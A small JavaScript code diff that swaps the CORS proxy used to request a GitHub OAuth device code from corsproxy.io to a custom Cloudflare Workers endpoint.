@@ -95,7 +95,7 @@ function applyI18n() {
 }
 
 async function startDeviceFlow() {
-  const proxy = 'https://corsproxy.io/?'
+  const proxy = 'https://open-jobs.631008982.workers.dev/?url='
   const deviceRes = await fetch(proxy + encodeURIComponent('https://github.com/login/device/code'), {
     method: 'POST',
     headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
